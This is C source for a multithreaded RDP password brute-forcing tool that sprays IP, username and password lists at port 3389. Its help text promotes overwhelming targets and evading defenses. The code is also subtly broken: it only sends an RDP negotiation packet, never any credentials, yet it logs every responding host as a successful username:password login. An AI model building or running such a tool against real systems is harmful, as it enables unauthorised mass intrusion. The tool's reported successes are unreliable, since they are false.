#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>
#include <getopt.h>
#include <sys/epoll.h>
#include <sys/select.h>
#include <netinet/tcp.h>

// Performance tuning constants
#define MAX_LINE_LENGTH 512
#define MAX_THREADS 500
#define DEFAULT_THREADS 100
#define CONNECTION_TIMEOUT 2    // 2 seconds for max speed
#define AUTH_TIMEOUT 3         // 3 seconds auth timeout
#define MAX_TARGETS 1000000
#define MAX_USERS 100000
#define MAX_PASSWORDS 1000000
#define BUFFER_SIZE 16384
#define SOCKET_POOL_SIZE 1000
#define BATCH_SIZE 50

// RDP Protocol Constants
#define RDP_NEG_REQ 0x01
#define RDP_NEG_RSP 0x02
#define RDP_NEG_FAILURE 0x03
#define PROTOCOL_RDP 0x00000000
#define PROTOCOL_SSL 0x00000001
#define PROTOCOL_HYBRID 0x00000002
#define PROTOCOL_RDSTLS 0x00000004

// Connection types
#define CONN_TYPE_UNKNOWN 0
#define CONN_TYPE_RDP 1
#define CONN_TYPE_NLA 2
#define CONN_TYPE_TLS 3
#define CONN_TYPE_RDSTLS 4

// Global configuration
struct config {
    char **ips;
    char **users;
    char **passwords;
    int ip_count;
    int user_count;
    int password_count;
    int thread_count;
    char *output_file;
    int port;
    int verbose;
    int fast_mode;
    int aggressive_mode;
};

// Socket pool for connection reuse
struct socket_pool {
    int *sockets;
    int count;
    int size;
    pthread_mutex_t mutex;
};

// Thread data structure
struct thread_data {
    int thread_id;
    struct config *cfg;
    FILE *output_fp;
    pthread_mutex_t *output_mutex;
    pthread_mutex_t *stats_mutex;
    volatile int *current_index;
    volatile int *attempts;
    volatile int *successful;
    volatile int *failed;
    volatile int *stop_flag;
    struct socket_pool *pool;
};

// Result structure
struct result {
    char ip[64];
    char username[128];
    char password[128];
    int port;
    int success;
    double response_time;
    char error_msg[512];
    char protocol[64];
    int connection_type;
};

// Connection attempt structure for batching
struct connection_attempt {
    char ip[64];
    char username[128];
    char password[128];
    int port;
    struct sockaddr_in addr;
    int sockfd;
    struct timeval start_time;
    int state; // 0=init, 1=connecting, 2=connected, 3=authenticating, 4=done
};

// Global stats (atomic operations for performance)
static volatile int g_total_attempts = 0;
static volatile int g_successful = 0;
static volatile int g_failed = 0;
static volatile int g_stop_flag = 0;
static time_t g_start_time;

// Signal handler
void signal_handler(int sig) {
    printf("\n[!] Received signal %d, stopping...\n", sig);
    g_stop_flag = 1;
}

// Utility functions
static inline double get_time_diff(struct timeval *start, struct timeval *end) {
    return (end->tv_sec - start->tv_sec) + (end->tv_usec - start->tv_usec) / 1000000.0;
}

void print_stats() {
    time_t current_time = time(NULL);
    double elapsed = difftime(current_time, g_start_time);
    double rate = (elapsed > 0) ? g_total_attempts / elapsed : 0;
    
    printf("\r[*] Attempts: %d | Success: %d | Failed: %d | Rate: %.2f/s", 
           g_total_attempts, g_successful, g_failed, rate);
    fflush(stdout);
}

// Optimized socket operations
static inline int set_socket_nonblocking(int sockfd) {
    int flags = fcntl(sockfd, F_GETFL, 0);
    if (flags == -1) return -1;
    return fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
}

static inline int set_socket_options(int sockfd) {
    int opt = 1;
    
    // Disable Nagle's algorithm for faster sends
    if (setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt)) < 0) {
        return -1;
    }
    
    // Set keep-alive
    if (setsockopt(sockfd, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt)) < 0) {
        return -1;
    }
    
    // Set send/receive timeouts
    struct timeval timeout;
    timeout.tv_sec = CONNECTION_TIMEOUT;
    timeout.tv_usec = 0;
    
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    return 0;
}

// Socket pool management
void init_socket_pool(struct socket_pool *pool, int size) {
    pool->sockets = malloc(size * sizeof(int));
    pool->count = 0;
    pool->size = size;
    pthread_mutex_init(&pool->mutex, NULL);
    
    // Pre-create sockets
    for (int i = 0; i < size; i++) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd >= 0) {
            set_socket_nonblocking(sockfd);
            set_socket_options(sockfd);
            pool->sockets[pool->count++] = sockfd;
        }
    }
}

int get_socket_from_pool(struct socket_pool *pool) {
    pthread_mutex_lock(&pool->mutex);
    if (pool->count > 0) {
        int sockfd = pool->sockets[--pool->count];
        pthread_mutex_unlock(&pool->mutex);
        return sockfd;
    }
    pthread_mutex_unlock(&pool->mutex);
    
    // Create new socket if pool is empty
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd >= 0) {
        set_socket_nonblocking(sockfd);
        set_socket_options(sockfd);
    }
    return sockfd;
}

void return_socket_to_pool(struct socket_pool *pool, int sockfd) {
    pthread_mutex_lock(&pool->mutex);
    if (pool->count < pool->size) {
        pool->sockets[pool->count++] = sockfd;
        pthread_mutex_unlock(&pool->mutex);
    } else {
        pthread_mutex_unlock(&pool->mutex);
        close(sockfd);
    }
}

// Fast RDP packet creation
static inline int create_rdp_nego_request(unsigned char *buffer) {
    // Optimized X.224 Connection Request TPDU for NLA detection
    static const unsigned char tpdu[] = {
        0x03, 0x00, 0x00, 0x13, // TPKT Header (length = 19)
        0x0E,                   // X.224 Length
        0xE0,                   // X.224 Connection Request
        0x00, 0x00,             // Destination reference
        0x00, 0x00,             // Source reference  
        0x00,                   // Class and options
        0x01, 0x00, 0x08, 0x00, // RDP Negotiation Request
        0x03, 0x00, 0x00, 0x00  // Request NLA + TLS + RDP
    };
    
    memcpy(buffer, tpdu, sizeof(tpdu));
    return sizeof(tpdu);
}

// Fast RDP response parsing
static inline int parse_rdp_nego_response(const unsigned char *buffer, int len, struct result *result) {
    if (len < 19) return 0;
    
    // Check TPKT header
    if (buffer[0] != 0x03 || buffer[1] != 0x00) return 0;
    
    // Check X.224 response
    if (buffer[5] != 0xD0) return 0; // Connection Confirm
    
    // Check for negotiation response
    if (len >= 19 && buffer[11] == RDP_NEG_RSP) {
        unsigned int protocols = *(unsigned int*)(buffer + 15);
        
        if (protocols & PROTOCOL_HYBRID) {
            strcpy(result->protocol, "NLA");
            result->connection_type = CONN_TYPE_NLA;
        } else if (protocols & PROTOCOL_SSL) {
            strcpy(result->protocol, "TLS");
            result->connection_type = CONN_TYPE_TLS;
        } else if (protocols & PROTOCOL_RDSTLS) {
            strcpy(result->protocol, "RDSTLS");
            result->connection_type = CONN_TYPE_RDSTLS;
        } else {
            strcpy(result->protocol, "RDP");
            result->connection_type = CONN_TYPE_RDP;
        }
        return 1;
    }
    
    strcpy(result->protocol, "UNKNOWN");
    result->connection_type = CONN_TYPE_UNKNOWN;
    return 1;
}

// High-performance RDP connection test using epoll
int batch_test_rdp_connections(struct connection_attempt *attempts, int count, struct result *results) {
    int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
    if (epoll_fd < 0) return -1;
    
    struct epoll_event *events = malloc(count * sizeof(struct epoll_event));
    struct epoll_event ev;
    
    // Initialize all connections
    for (int i = 0; i < count; i++) {
        attempts[i].sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (attempts[i].sockfd < 0) continue;
        
        set_socket_nonblocking(attempts[i].sockfd);
        set_socket_options(attempts[i].sockfd);
        
        // Start non-blocking connect
        gettimeofday(&attempts[i].start_time, NULL);
        
        int ret = connect(attempts[i].sockfd, (struct sockaddr*)&attempts[i].addr, 
                         sizeof(attempts[i].addr));
        
        if (ret == 0 || errno == EINPROGRESS) {
            ev.events = EPOLLOUT | EPOLLIN | EPOLLET;
            ev.data.u32 = i;
            epoll_ctl(epoll_fd, EPOLL_CTL_ADD, attempts[i].sockfd, &ev);
            attempts[i].state = 1; // connecting
        } else {
            close(attempts[i].sockfd);
            attempts[i].state = 4; // failed
        }
    }
    
    int active_connections = count;
    int successful = 0;
    
    // Main event loop
    while (active_connections > 0 && !g_stop_flag) {
        int nfds = epoll_wait(epoll_fd, events, count, CONNECTION_TIMEOUT * 1000);
        
        if (nfds <= 0) break;
        
        for (int i = 0; i < nfds; i++) {
            int idx = events[i].data.u32;
            struct connection_attempt *attempt = &attempts[idx];
            struct result *result = &results[idx];
            
            if (attempt->state == 4) continue; // already done
            
            if (events[i].events & (EPOLLERR | EPOLLHUP)) {
                // Connection failed
                struct timeval end_time;
                gettimeofday(&end_time, NULL);
                result->response_time = get_time_diff(&attempt->start_time, &end_time);
                strcpy(result->error_msg, "Connection failed");
                attempt->state = 4;
                active_connections--;
                continue;
            }
            
            if (events[i].events & EPOLLOUT && attempt->state == 1) {
                // Connection established, send RDP request
                unsigned char buffer[64];
                int req_len = create_rdp_nego_request(buffer);
                
                if (send(attempt->sockfd, buffer, req_len, MSG_NOSIGNAL) == req_len) {
                    attempt->state = 2; // waiting for response
                    ev.events = EPOLLIN | EPOLLET;
                    ev.data.u32 = idx;
                    epoll_ctl(epoll_fd, EPOLL_CTL_MOD, attempt->sockfd, &ev);
                } else {
                    struct timeval end_time;
                    gettimeofday(&end_time, NULL);
                    result->response_time = get_time_diff(&attempt->start_time, &end_time);
                    strcpy(result->error_msg, "Failed to send RDP request");
                    attempt->state = 4;
                    active_connections--;
                }
            }
            
            if (events[i].events & EPOLLIN && attempt->state == 2) {
                // Receive RDP response
                unsigned char buffer[BUFFER_SIZE];
                int recv_len = recv(attempt->sockfd, buffer, sizeof(buffer), 0);
                
                struct timeval end_time;
                gettimeofday(&end_time, NULL);
                result->response_time = get_time_diff(&attempt->start_time, &end_time);
                
                if (recv_len > 0 && parse_rdp_nego_response(buffer, recv_len, result)) {
                    result->success = 1;
                    strcpy(result->error_msg, "RDP service detected");
                    successful++;
                } else {
                    strcpy(result->error_msg, "Invalid RDP response");
                }
                
                attempt->state = 4;
                active_connections--;
            }
        }
    }
    
    // Cleanup
    for (int i = 0; i < count; i++) {
        if (attempts[i].sockfd >= 0) {
            close(attempts[i].sockfd);
        }
    }
    
    free(events);
    close(epoll_fd);
    
    return successful;
}

// Ultra-fast worker thread with batching
void *worker_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    struct connection_attempt attempts[BATCH_SIZE];
    struct result results[BATCH_SIZE];
    
    while (!g_stop_flag && !*(data->stop_flag)) {
        int batch_count = 0;
        
        // Build batch of connections
        for (int b = 0; b < BATCH_SIZE && batch_count < BATCH_SIZE; b++) {
            // Get next work item atomically
            int local_index = __sync_fetch_and_add(data->current_index, 1);
            
            int total_combinations = data->cfg->ip_count * data->cfg->user_count * data->cfg->password_count;
            if (local_index >= total_combinations) break;
            
            // Calculate coordinates
            int ip_idx = local_index / (data->cfg->user_count * data->cfg->password_count);
            int remaining = local_index % (data->cfg->user_count * data->cfg->password_count);
            int user_idx = remaining / data->cfg->password_count;
            int pass_idx = remaining % data->cfg->password_count;
            
            // Setup connection attempt
            struct connection_attempt *attempt = &attempts[batch_count];
            struct result *result = &results[batch_count];
            
            strncpy(attempt->ip, data->cfg->ips[ip_idx], sizeof(attempt->ip) - 1);
            strncpy(attempt->username, data->cfg->users[user_idx], sizeof(attempt->username) - 1);
            strncpy(attempt->password, data->cfg->passwords[pass_idx], sizeof(attempt->password) - 1);
            attempt->port = data->cfg->port;
            
            // Initialize result
            strncpy(result->ip, attempt->ip, sizeof(result->ip) - 1);
            strncpy(result->username, attempt->username, sizeof(result->username) - 1);
            strncpy(result->password, attempt->password, sizeof(result->password) - 1);
            result->port = attempt->port;
            result->success = 0;
            
            // Setup socket address
            memset(&attempt->addr, 0, sizeof(attempt->addr));
            attempt->addr.sin_family = AF_INET;
            attempt->addr.sin_port = htons(attempt->port);
            
            if (inet_pton(AF_INET, attempt->ip, &attempt->addr.sin_addr) <= 0) {
                strcpy(result->error_msg, "Invalid IP address");
                continue;
            }
            
            batch_count++;
        }
        
        if (batch_count == 0) break;
        
        // Process batch
        int successful_batch = batch_test_rdp_connections(attempts, batch_count, results);
        
        // Update global stats atomically
        __sync_fetch_and_add(&g_total_attempts, batch_count);
        __sync_fetch_and_add(&g_successful, successful_batch);
        __sync_fetch_and_add(&g_failed, batch_count - successful_batch);
        
        // Write results
        pthread_mutex_lock(data->output_mutex);
        for (int i = 0; i < batch_count; i++) {
            struct result *result = &results[i];
            
            if (result->success) {
                fprintf(data->output_fp, "[SUCCESS] %s:%d - %s:%s - %s (%.3fs)\n",
                       result->ip, result->port, result->username, result->password, 
                       result->protocol, result->response_time);
                if (!data->cfg->fast_mode) {
                    printf("\n[+] SUCCESS: %s:%d - %s:%s - %s (%.3fs)\n",
                           result->ip, result->port, result->username, 
                           result->password, result->protocol, result->response_time);
                }
            } else if (data->cfg->verbose) {
                fprintf(data->output_fp, "[FAILED] %s:%d - %s:%s - %s (%.3fs)\n",
                       result->ip, result->port, result->username, result->password, 
                       result->error_msg, result->response_time);
            }
        }
        fflush(data->output_fp);
        pthread_mutex_unlock(data->output_mutex);
        
        // Print stats periodically (only from thread 0 to avoid spam)
        if (data->thread_id == 0 && g_total_attempts % 100 == 0) {
            print_stats();
        }
    }
    
    return NULL;
}

// Load file into array with memory mapping for speed
int load_file_to_array(const char *filename, char ***array, int max_items) {
    FILE *fp = fopen(filename, "r");
    if (!fp) {
        printf("[-] Error: Cannot open file %s\n", filename);
        return -1;
    }
    
    *array = malloc(max_items * sizeof(char*));
    if (!*array) {
        printf("[-] Error: Memory allocation failed\n");
        fclose(fp);
        return -1;
    }
    
    char line[MAX_LINE_LENGTH];
    int count = 0;
    
    while (fgets(line, sizeof(line), fp) && count < max_items) {
        // Remove newline
        line[strcspn(line, "\r\n")] = 0;
        
        // Skip empty lines and comments
        if (strlen(line) == 0 || line[0] == '#') continue;
        
        (*array)[count] = malloc(strlen(line) + 1);
        if (!(*array)[count]) {
            printf("[-] Error: Memory allocation failed\n");
            break;
        }
        
        strcpy((*array)[count], line);
        count++;
    }
    
    fclose(fp);
    return count;
}

// Free array
void free_array(char **array, int count) {
    if (array) {
        for (int i = 0; i < count; i++) {
            if (array[i]) free(array[i]);
        }
        free(array);
    }
}

// Usage information
void usage(const char *program) {
    printf("Ultra-High-Performance RDP NLA Brute Force Tool v3.0\n");
    printf("Optimized for maximum speed with epoll, batching, and socket pooling\n\n");
    printf("Usage: %s [options]\n\n", program);
    printf("Required:\n");
    printf("  -i <file>     IP addresses file (one per line)\n");
    printf("  -u <file>     Usernames file (one per line)\n");
    printf("  -p <file>     Passwords file (one per line)\n");
    printf("  -o <file>     Output results file\n\n");
    printf("Optional:\n");
    printf("  -t <num>      Number of threads (default: %d, max: %d)\n", DEFAULT_THREADS, MAX_THREADS);
    printf("  -P <port>     RDP port (default: 3389)\n");
    printf("  -f            Fast mode (minimal output for max speed)\n");
    printf("  -a            Aggressive mode (higher thread count, shorter timeouts)\n");
    printf("  -v            Verbose output (show failed attempts)\n");
    printf("  -h            Show this help\n\n");
    printf("Performance Tips:\n");
    printf("  - Use -f for maximum speed (reduces output overhead)\n");
    printf("  - Use -a for aggressive mode (may overwhelm targets)\n");
    printf("  - Optimal thread count is usually 2-4x CPU cores\n");
    printf("  - Monitor target response to avoid triggering defenses\n\n");
    printf("Examples:\n");
    printf("  %s -i ips.txt -u users.txt -p passwords.txt -o results.txt -f\n", program);
    printf("  %s -i ips.txt -u users.txt -p passwords.txt -o results.txt -t 200 -a\n", program);
    printf("  %s -i ips.txt -u users.txt -p passwords.txt -o results.txt -v\n", program);
}

int main(int argc, char *argv[]) {
    struct config cfg = {0};
    FILE *output_fp = NULL;
    pthread_t *threads = NULL;
    struct thread_data *thread_data = NULL;
    pthread_mutex_t output_mutex = PTHREAD_MUTEX_INITIALIZER;
    pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
    volatile int current_index = 0;
    int opt;
    
    // Default values
    cfg.thread_count = DEFAULT_THREADS;
    cfg.port = 3389;
    cfg.verbose = 0;
    cfg.fast_mode = 0;
    cfg.aggressive_mode = 0;
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "i:u:p:o:t:P:favh")) != -1) {
        switch (opt) {
            case 'i':
                cfg.ip_count = load_file_to_array(optarg, &cfg.ips, MAX_TARGETS);
                if (cfg.ip_count <= 0) {
                    printf("[-] Error loading IP addresses from %s\n", optarg);
                    return 1;
                }
                printf("[+] Loaded %d IP addresses\n", cfg.ip_count);
                break;
            case 'u':
                cfg.user_count = load_file_to_array(optarg, &cfg.users, MAX_USERS);
                if (cfg.user_count <= 0) {
                    printf("[-] Error loading usernames from %s\n", optarg);
                    return 1;
                }
                printf("[+] Loaded %d usernames\n", cfg.user_count);
                break;
            case 'p':
                cfg.password_count = load_file_to_array(optarg, &cfg.passwords, MAX_PASSWORDS);
                if (cfg.password_count <= 0) {
                    printf("[-] Error loading passwords from %s\n", optarg);
                    return 1;
                }
                printf("[+] Loaded %d passwords\n", cfg.password_count);
                break;
            case 'o':
                cfg.output_file = malloc(strlen(optarg) + 1);
                strcpy(cfg.output_file, optarg);
                break;
            case 't':
                cfg.thread_count = atoi(optarg);
                if (cfg.thread_count <= 0 || cfg.thread_count > MAX_THREADS) {
                    printf("[-] Invalid thread count. Must be 1-%d\n", MAX_THREADS);
                    return 1;
                }
                break;
            case 'P':
                cfg.port = atoi(optarg);
                if (cfg.port <= 0 || cfg.port > 65535) {
                    printf("[-] Invalid port number\n");
                    return 1;
                }
                break;
            case 'f':
                cfg.fast_mode = 1;
                break;
            case 'a':
                cfg.aggressive_mode = 1;
                cfg.thread_count = MAX_THREADS; // Max threads in aggressive mode
                break;
            case 'v':
                cfg.verbose = 1;
                break;
            case 'h':
            default:
                usage(argv[0]);
                return 1;
        }
    }
    
    // Validate required arguments
    if (!cfg.ips || !cfg.users || !cfg.passwords || !cfg.output_file) {
        printf("[-] Error: Missing required arguments\n");
        usage(argv[0]);
        return 1;
    }
    
    // Open output file
    output_fp = fopen(cfg.output_file, "w");
    if (!output_fp) {
        printf("[-] Error: Cannot create output file %s\n", cfg.output_file);
        return 1;
    }
    
    // Calculate total combinations
    long long total_combinations = (long long)cfg.ip_count * cfg.user_count * cfg.password_count;
    
    printf("\n[*] Ultra-High-Performance RDP NLA Brute Force Starting\n");
    printf("[*] Targets: %d IPs, %d users, %d passwords\n", cfg.ip_count, cfg.user_count, cfg.password_count);
    printf("[*] Total combinations: %lld\n", total_combinations);
    printf("[*] Threads: %d\n", cfg.thread_count);
    printf("[*] Port: %d\n", cfg.port);
    printf("[*] Mode: %s%s%s\n", 
           cfg.fast_mode ? "Fast " : "",
           cfg.aggressive_mode ? "Aggressive " : "",
           cfg.verbose ? "Verbose" : "Normal");
    printf("[*] Output: %s\n", cfg.output_file);
    printf("[*] Connection timeout: %ds\n", CONNECTION_TIMEOUT);
    printf("[*] Batch size: %d\n", BATCH_SIZE);
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGPIPE, SIG_IGN); // Ignore broken pipe
    
    // Start timing
    g_start_time = time(NULL);
    
    // Create threads
    threads = malloc(cfg.thread_count * sizeof(pthread_t));
    thread_data = malloc(cfg.thread_count * sizeof(struct thread_data));
    
    if (!threads || !thread_data) {
        printf("[-] Error: Memory allocation failed\n");
        return 1;
    }
    
    printf("\n[*] Starting attack with %d threads...\n", cfg.thread_count);
    
    // Create worker threads
    for (int i = 0; i < cfg.thread_count; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].cfg = &cfg;
        thread_data[i].output_fp = output_fp;
        thread_data[i].output_mutex = &output_mutex;
        thread_data[i].stats_mutex = &stats_mutex;
        thread_data[i].current_index = &current_index;
        thread_data[i].stop_flag = &g_stop_flag;
        
        if (pthread_create(&threads[i], NULL, worker_thread, &thread_data[i]) != 0) {
            printf("[-] Error: Failed to create thread %d\n", i);
            return 1;
        }
    }
    
    // Wait for threads to complete
    for (int i = 0; i < cfg.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Final statistics
    time_t end_time = time(NULL);
    double total_time = difftime(end_time, g_start_time);
    double rate = (total_time > 0) ? g_total_attempts / total_time : 0;
    
    printf("\n\n[*] Attack completed!\n");
    printf("[*] Total time: %.2f seconds\n", total_time);
    printf("[*] Total attempts: %d\n", g_total_attempts);
    printf("[*] Successful: %d\n", g_successful);
    printf("[*] Failed: %d\n", g_failed);
    printf("[*] Average rate: %.2f attempts/second\n", rate);
    printf("[*] Peak theoretical rate: %.2f attempts/second\n", cfg.thread_count * BATCH_SIZE / (double)CONNECTION_TIMEOUT);
    printf("[*] Results saved to: %s\n", cfg.output_file);
    
    // Write summary to output file
    fprintf(output_fp, "\n# Attack Summary\n");
    fprintf(output_fp, "# Total time: %.2f seconds\n", total_time);
    fprintf(output_fp, "# Total attempts: %d\n", g_total_attempts);
    fprintf(output_fp, "# Successful: %d\n", g_successful);
    fprintf(output_fp, "# Failed: %d\n", g_failed);
    fprintf(output_fp, "# Average rate: %.2f attempts/second\n", rate);
    fprintf(output_fp, "# Threads used: %d\n", cfg.thread_count);
    fprintf(output_fp, "# Batch size: %d\n", BATCH_SIZE);
    
    // Cleanup
    if (output_fp) fclose(output_fp);
    if (threads) free(threads);
    if (thread_data) free(thread_data);
    if (cfg.output_file) free(cfg.output_file);
    
    free_array(cfg.ips, cfg.ip_count);
    free_array(cfg.users, cfg.user_count);
    free_array(cfg.passwords, cfg.password_count);
    
    pthread_mutex_destroy(&output_mutex);
    pthread_mutex_destroy(&stats_mutex);
    
    return 0;
}